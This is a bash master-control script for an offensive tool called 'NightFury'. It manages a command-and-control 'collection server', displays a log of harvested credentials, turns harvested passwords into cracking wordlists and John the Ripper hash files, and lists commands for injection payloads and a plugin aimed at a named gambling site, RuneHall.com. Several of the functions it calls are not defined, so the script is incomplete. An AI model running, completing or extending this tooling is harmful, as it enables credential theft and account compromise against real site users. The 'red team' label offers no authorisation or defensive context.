#!/bin/bash
#
# NightFury Framework - Master Control Script
# Professional Red Team Operations Platform
#
# Usage: nightfury.sh [command] [options]
#

set -e

# Configuration
NIGHTFURY_HOME="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
NIGHTFURY_CONFIG="${NIGHTFURY_HOME}/config"
NIGHTFURY_LOGS="${NIGHTFURY_HOME}/logs"
NIGHTFURY_DATA="${NIGHTFURY_HOME}/data"

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m'

# Functions
print_banner() {
    cat << "EOF"
    ███╗   ██╗██╗ ██████╗ ██╗  ██╗████████╗███████╗██╗   ██╗██████╗ ██╗   ██╗
    ████╗  ██║██║██╔════╝ ██║  ██║╚══██╔══╝██╔════╝██║   ██║██╔══██╗╚██╗ ██╔╝
    ██╔██╗ ██║██║██║  ███╗███████║   ██║   █████╗  ██║   ██║██████╔╝ ╚████╔╝ 
    ██║╚██╗██║██║██║   ██║██╔══██║   ██║   ██╔══╝  ██║   ██║██╔══██╗  ╚██╔╝  
    ██║ ╚████║██║╚██████╔╝██║  ██║   ██║   ██║     ╚██████╔╝██║  ██║   ██║   
    ╚═╝  ╚═══╝╚═╝ ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚═╝      ╚═════╝ ╚═╝  ╚═╝   ╚═╝   
                        Professional Red Team Operations Framework
                                    Version 2.5 (Crack-Prep Enabled)
EOF
}

print_info() { echo -e "${BLUE}[*]${NC} $1"; }
print_success() { echo -e "${GREEN}[+]${NC} $1"; }
print_error() { echo -e "${RED}[!]${NC} $1"; }

# Command: Crack-Prep
cmd_crackprep() {
    local action="${1:-wordlist}"
    export PYTHONPATH="${NIGHTFURY_HOME}:${PYTHONPATH}"
    case "$action" in
        wordlist)
            print_info "Generating unique password wordlist..."
            python3 -c "from utilities.crack_prep import CrackPrep; cp = CrackPrep(); print('\n'.join(cp.extract_passwords()))" > "${NIGHTFURY_DATA}/exports/harvested_wordlist.txt"
            print_success "Wordlist saved to: data/exports/harvested_wordlist.txt"
            ;;
        john)
            print_info "Formatting for John the Ripper..."
            python3 -c "from utilities.crack_prep import CrackPrep; cp = CrackPrep(); cp.format_for_john('${NIGHTFURY_DATA}/exports/john_hashes.txt')"
            print_success "John format saved to: data/exports/john_hashes.txt"
            ;;
        *)
            print_error "Usage: nightfury.sh crackprep [wordlist|john]"
            ;;
    esac
}

# Command: C2 Server
cmd_c2() {
    local action="${1:-status}"
    case "$action" in
        start)
            print_info "Starting NightFury C2 Collection Server..."
            nohup python3 "${NIGHTFURY_HOME}/core/c2_server.py" > "${NIGHTFURY_LOGS}/c2_stdout.log" 2>&1 &
            print_success "C2 Server started in background (Port 8080)"
            ;;
        stop)
            print_info "Stopping C2 Server..."
            pkill -f "python3.*c2_server.py" || true
            print_success "C2 Server stopped"
            ;;
        logs)
            print_info "Viewing harvested credentials..."
            tail -f "${NIGHTFURY_LOGS}/harvested_creds.json"
            ;;
        status)
            pgrep -f "c2_server.py" > /dev/null && print_success "C2 Server is RUNNING" || print_warning "C2 Server is STOPPED"
            ;;
        *)
            print_error "Usage: nightfury.sh c2 [start|stop|logs|status]"
            ;;
    esac
}

# Command: Help
cmd_help() {
    cat << EOF
NightFury Crack-Prep Enabled - Command Reference

CORE:
  status              Show framework status
  c2 [start|stop|logs] Manage C2 Collection Server
  crackprep [wordlist|john] Prepare data for password cracking
  inject [type]       Generate Overlay/Chat Injection payloads
  runehall <cmd>      RuneHall.com Specialized Plugin
  panic               Emergency cleanup and exit

EXAMPLES:
  nightfury.sh crackprep wordlist
  nightfury.sh crackprep john
EOF
}

# Main command dispatcher
main() {
    mkdir -p "${NIGHTFURY_LOGS}" "${NIGHTFURY_DATA}/exports" "${NIGHTFURY_DATA}/reports"
    local command="${1:-help}"
    shift || true
    case "$command" in
        c2) cmd_c2 "$@" ;;
        crackprep) cmd_crackprep "$@" ;;
        inject) cmd_inject "$@" ;;
        status) cmd_status "$@" ;;
        help|--help|-h) print_banner; cmd_help ;;
        *) print_error "Unknown command: $command"; exit 1 ;;
    esac
}

main "$@"
